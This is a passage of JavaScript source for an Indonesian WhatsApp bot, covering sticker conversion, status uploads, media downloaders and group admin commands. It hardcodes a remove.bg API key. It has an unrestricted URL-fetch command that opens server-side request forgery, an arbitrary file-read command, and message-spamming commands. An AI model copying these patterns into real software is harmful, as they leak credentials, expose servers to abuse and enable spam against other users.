} else if ((isMedia && zer.message.videoMessage.seconds < 11 || isQuotedVideo && zer.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
let media = await zero.downloadAndSaveMediaMessage(encmedia, './storage/media_user')
ran = getRandom('.webp')
reply(mess.wait)
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Gagal, Pada Saat Mengkonversi ${tipe} Ke Stiker. Pastikan Untuk Video Yang Dikirim Tidak Lebih Dari 9 Detik`)
})
.on('end', function () {
console.log('Finish')
costum(fs.readFileSync(ran), sticker, Verived, `~ Nih Dah Jadi Gif Stikernya`)
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
let media = await zero.downloadAndSaveMediaMessage(encmedia, './storage/media_user')
ranw = getRandom('.webp')
ranp = getRandom('.png')
reply(mess.wait)
keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
await removeBackgroundFromImageFile({ path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp }).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
if (err) return reply('Gagal, Terjadi Kesalahan, Silahkan Coba Beberapa Saat Lagi.')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(mess.error.stick)
zero.sendMessage(from, fs.readFileSync(ranw), sticker, { quoted: ftrol })
fs.unlinkSync(ranw)
})
})
} else {
reply(`Kirim Gambar Dengan Caption ${prefix}sticker Atau Tag Gambar Yang Sudah Dikirim`)
}
break
case 'attp':
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
zero.sendMessage(from, buffer, sticker, { quoted: ftrol })
break
case 'ttp':
if (args.length == 0) return reply(`Example: ${prefix + command} Hai`)
buffer = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${encodeURI(q)}`)
zero.sendMessage(from, buffer, sticker, { quoted: zer })
break
	/*	case 'toimg':
					if (!isQuotedSticker) return reply('❌ reply stickernya um ❌')
					reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zero.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ Gagal, pada saat mengkonversi sticker ke gambar ❌')
						buffer = fs.readFileSync(ran)
						zero.sendMessage(from, buffer, image, {quoted: zer, caption: '>//<'})
						fs.unlinkSync(ran)
					})
					break*/
                 case 'toimg':
				case 'tomedia':
              
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (zer.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await zero.downloadAndSaveMediaMessage(encmedia)
						const upload = await uploadimg(media, Date.now() + '.webp')
						console.log(upload)
						reply(`${upload.result.image}`)
						const rume = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${upload.result.image}`)
						console.log(rume.data)
						sendMediaURL(from, rume.data.result)
					} else {
						const encmedia = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await zero.downloadAndSaveMediaMessage(encmedia)
						ran = '1000.png'
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							fs.unlinkSync(media)
							if (err) return reply(mess.error.api)
							buffer = fs.readFileSync(ran)
							zero.sendMessage(from, buffer, image, {quoted: zer})
							fs.unlinkSync(ran)
						})
					}
					break
case 'owner':
let inilist = []
for (let i of ownerNumber) {
let vname = zero.contacts[i] != undefined ? zero.contacts[i].vname || zero.contacts[i].notify : undefined
inilist.push({
"displayName": 'BTR X-BOT OFC',
"vcard": 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${NameOwner}\n`
+ `ORG: Creator ${NameOwner} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${NomorOwner}:${NomorOwner}\n`
+ 'END:VCARD'.trim()
})
}
hehe = await zero.sendMessage(from, {
"displayName": `${inilist.length} kontak`,
"contacts": inilist 
}, 'contactsArrayMessage', { quoted: ftrol })
button = [
{buttonId: 'youtube', buttonText: {displayText: 'YOUTUBE'}, type: 1},
{buttonId: 'instagram', buttonText: {displayText: 'INSTAGRAM'}, type: 1},
{buttonId: 'tiktok', buttonText: {displayText: 'TIKTOK'}, type: 1}
]
 buttons = {
contentText: 'Nih Nomer Owner Ku Mau Tau Tentang Apa Ya ?',
footerText: faketeks,
buttons: button,
headerType: 1
}
await zero.sendMessage(from, buttons, MessageType.buttonsMessage, {quoted: ftrol})
break      
case 'report':
let pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: ftrol })
var nomor = zer.participant
let teks1 = `[𝗥𝗘𝗣𝗢𝗥𝗧]\n𝐏𝐞𝐬𝐚𝐧 : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
zero.sendMessage(`6282313021398@s.whatsapp.net`, options, text, { quoted: ftrol })
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
case 'youtube':
teks =
`Nih Youtube Owner Ku Jangan Lupa Di Subscribe Ya https://youtube.com/Bambangofficial`
zero.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'instagram':
teks =
`Nih Instagram Owner Ku Jangan Lupa Di Follow Ya https://instagram.com/btr_three`
zero.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'tiktok':
teks =
`Nih Tiktok Owner Ku Jangan Lupa Di Follow Ya https://tiktok.com/@sadboy.edtz`
zero.sendMessage(from, teks, text, {quoted: ftrol})
break
case 'sourcecode':
case 'script':
case 'sc':
teks = `Script?? Beli Donk Asw Dobol Kunyuk Pantexx`
zero.sendMessage(from, teks, text, {quoted : zer})
break
case "runtime":
case "test":
run = process.uptime();
teks = `${kyun(run)}`;
reply(teks);
break
case 'speed':
case 'ping':
reply(`Speed: ${latensyi.toFixed(4)} Second`)
break
 case 'delchat':
                   if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                zero.modifyChat(from, ChatModification.delete)
                break
                case 'mute':
			    if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./storage/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
                case 'spam':
				if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					zero.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.bodmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                zero.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
                if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.bodmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                zero.groupMakeAdmin(from, members_id)
                break
                case 'spamsw':
if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					zero.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
                    case 'upswteks':
                    if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    zero.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    zero.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NameBot}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                                        case 'upswsticker':
                    if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !zer.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
						buff = await zero.downloadMediaMessage(encmedia)
						zero.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                    case 'upswaudio':
                    if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !zer.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
						buff = await zero.downloadMediaMessage(encmedia)
						zero.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !zer.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(zer).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : zer
						buff = await zero.downloadMediaMessage(encmedia)
						zero.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
						case 'upswvideo':
if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await zero.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    zero.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                        case 'upswgif':
if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zero.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    zero.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zero.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    zero.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: ftrol, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
                        case 'shutdown':
					if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
				return zero.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'online':
            if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
				offline = false
				reply('Status : ONLINE')
				break
			case 'offline':
			if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
				offline = true
				reply('Status : OFFLINE')
				break
				                    case 'exif':
                    if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done gan')
				break
				case 'setprofile':
				case 'setppbot':
				zero.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
					enmediau = JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await zero.downloadAndSaveMediaMessage(enmediau)
					await zero.updateProfilePicture(botNumber, mediau)
					reply('Terima Kasih Kak Pp Barunya😍')
					break
					case 'setnamebot':
					if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                zero.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
                case 'setprefix':
      if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
      if (args.length < 1) return reply(`Contoh ${prefix + command} multi/nopref`)
           if (q === 'multi'){
              multi = true
                    reply(`Berhasil mengubah prefix ke ${q}`)
                } else if (q === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${q}`
                    reply(`Berhasil mengubah prefix ke ${q}`)
					}
					break
					case 'setbio':
				if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					zero.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
					case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
				zero.updatePresence(from, Presence.composing)
				zero.groupLeave(from)
						break
						case 'restart':
if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
reply(`_Restarting ${NameBot}_`)
exec(`cd &&  node index`)
sleep(4000)
reply('Sukses')
break
case 'join':
				if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
				 if (args.length < 1) return reply('Link nya mana?')
					zero.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Sukses bergabung dalam group')
break
case 'freeoneday':
				 if (args.length < 1) return reply('Link nya mana?')
					zero.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Sukses disewa dalam group')
break
case 'readall':
                if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
                var chats = await zero.chats.all()
                chats.map( async ({ jid }) => {
                await zero.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await zero.sendMessage(from, teks, text, {quoted: ftrol})
		console.log(chats.length)
		break
		case 'unreadall':
                if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
                var chats = await zero.chats.all()
                chats.map( async ({ jid }) => {
                await zero.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await zero.sendMessage(from, teks, text, {quoted: ftrol})
		    console.log(chats.length)
	        break
	case 'pin':
                if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
                zero.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
                case 'unpin':
                if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
                zero.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
                case 'nano':
if (!isOwner && !zer.key.fromMe) return reply(mess.only.owner)
if (!q) return reply('Nama file nya apaa ?')
anu = fs.readFileSync(`${q}`)
reply(String(anu))
break
case 'infogempa':
              anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${apikey7}`, {method: 'get'})
					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					zero.sendMessage(from, buff, image, {quoted: ftrol, caption: gempa})
					break 
case 'herolist':
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
case 'infobot':
timestamp = speed();
latensi = speed() - timestamp
teks =
`┏━➤ *INFO BOT* 
*┃┃* Creator Bot : BAMBANG TRI RAHARJO
*┃┃* Nama Owner : ${NameOwner}
*┃┃* Nama Bot : ${NameBot}
*┃┃* Prefix : Multi Prefix
*┃┃* Total Pengguna : ${pendaftar.length}
*┃┃* Runtime : ${runtime(process.uptime())}
*┃┃* Speed : ${latensi.toFixed(4)} second
*┃┃* Language : Javascript
*┃┗━━━━━━━━*
*┃◗ Thanks To Allah S.W.T*
*┃◗ Thank To Ortu*
*┃◗ Thank To Zero YT7 (MStah)*
*┃◗ Thank To BAMBANG TRI RAHARJO (Creator)*
*┃◗ Thanks To All Subscriberku*
*┗━━━━━━━ •*`
                  but = [
{ buttonId: `script`, buttonText: { displayText: '📌 SCRIPT' }, type: 1 },
{ buttonId: `owner`, buttonText: { displayText: '👥 OWNER' }, type: 1 }
]
sendButLocation(from, teks, faketeks, fakeimg, but)
break
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'gimage':
case 'googleimage':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
reply(mess.wait)
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: ftrol, caption: `*Hasil Pencarian Dari :* ${teks}`})
}
}
break
                                    case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: ftrol, caption: result}).catch(e => {
  reply(result)
})
break
 case 'mediafire':
									if (args.length < 1) return reply('Masukkan link mediafire')
									if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Linknya Error')
									reply(mess.wait)
									teks = args.join(' ')
									res = await mediafireDl(teks)
									result = ` MEDIAFIRE DOWNLOAD

Data Berhasil Didapatkan!

📌 Nama : ${res[0].nama}
✉️ Ukuran : ${res[0].size}
🌐 Link : ${res[0].link}

_Tunggu Proses Upload Media_`
									reply(result)
									sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: ftrol})
									break
									case 'ytsearch':
                if (!args.length) return reply('Judulnya apa kak?')
            try {
            	reply(mess.wait)
                const input = args.join(" ")
                const filter1 = await ytsd.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsd(filters1.url, { limit: 10 })
                let hehe = `*🔖 YOUTUBE SEARCH*
*🔖 Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
*🔖 Judul:* ${items[i].title}
*🔖 Id:* ${items[i].id}
*🔖 Ditonton:* ${items[i].views}
*🔖 Durasi:* ${items[i].duration}
*🔖 Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await zero.sendMessage(from, thumb, image, {quoted: ftrol, caption: `${hehe}───────────────\n
*🔖 DOWNLOAD*
🔖 ${prefix}ytmp3 [link yt] = Audio
🔖 ${prefix}ytmp4 [link yt] = Video`, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`SEARCH: ${args[0]}`,body:"🔖YOUTUBE SEARCH",mediaType:"2",thumbnail:fakethumb,mediaUrl:`https://youtu.be/JN_Gw2GzuqQ`}}})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
            case 'ytmp4':
if (args.length == 0) return reply(`Link Nya Mana ?\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
ini_link = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey1}&url=${ini_link}`)
get_result = get_result.result
ini_txt = `${get_result.title} - ${get_result.size}`
ini_buffer = await getBuffer(get_result.thumbnail)
await zero.sendMessage(from, ini_buffer, image, { quoted: ftrol, caption: ini_txt })
get_audio = await getBuffer(get_result.link)
await zero.sendMessage(from, get_audio, video, { mimetype: 'video/mp4', filename: `${get_result.title}.mp4`, quoted: ftrol, caption: 'Nih Jangan Lupa Subscribe BAMBANG TRI RAHARJO'})
break
case 'ytmp3':
if (args.length === 0) return reply(`Link Nya Mana ?\nContoh: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if (!isLinks) return reply('Eror')
var srch = args.join(' ')
try {
yta(srch)
.then((res) => {
var { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
var captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
await sendMediaURL(from, thumb, captions)
sendMediaURL(from, dl_link).catch(() => reply('error'))
}) 
})
} catch (err) {
reply('Terjadi kesalahan')
}
break
 case 'ytmp4':
              if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
						let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
						if (!isLinks2) return reply(mess.error.Iv)
						try {
							sticWait(from)
							ytv(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ *YTmp4*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"🔖 YTMP4",mediaType:"2",thumbnail:getBuffer(thumb),sourceUrl:`${body.slice(7)}`}}}).catch(() => reply(mess.error.api))
							})
							})
						} catch (err) {
							reply(mess.error.api)
						}
						break
						case 'play':
if (args.length < 1) return reply('Masukin Judul Lagunya')
teks = args.join(' ')
reply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(` Playing ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
• *Judul :* ${res.all[0].title}
• *ID Video :* ${res.all[0].videoId}
• *Diupload Pada :* ${res.all[0].ago}
• *Views :* ${res.all[0].views}
• *Durasi :* ${res.all[0].timestamp}
• *Channel :* ${res.all[0].author.name}
• *Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: zer, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
var tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botname}* 
• *Judul :* ${res.all[0].title}
• *ID Video :* ${res.all[0].videoId}
• *Diupload Pada :* ${res.all[0].ago}
• *Views :* ${res.all[0].views}
• *Durasi :* ${res.all[0].timestamp}
• *Channel :* ${res.all[0].author.name}
• *Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: zer, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: zer, mimetype: 'audio/mp3', filename: res[0].output})
}
break
case 'tinyurl':
           try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
 case 'get':
case 'fetch':
if(!q) return reply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
            case 'igdl':
case 'instagram':
if (!q) return reply('Linknya?')
var { igDownloader } = require('../mess/igdown')
   res = await igDownloader(`${q}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
                    case 'tiktok':
                   case 'tiktokdl':
                   case 'tiktoknowm':
if (!q) return reply('Linknya?')
var { TiktokDownloader } = require('../mess/tiktokdl')
reply(mess.wait)
res = await TiktokDownloader(`${q}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
break
case 'tourl':
    if ((isMedia && !zer.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(zer).replace('quotedM','m')).message.extendedTextMessage.contextInfo : zer
            owgi = await zero.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
case 'lirik':
if (args.length < 1) return reply('Judulnya?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
case 'resepmasakan':
              if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${apikey7}`, {method: 'get'})
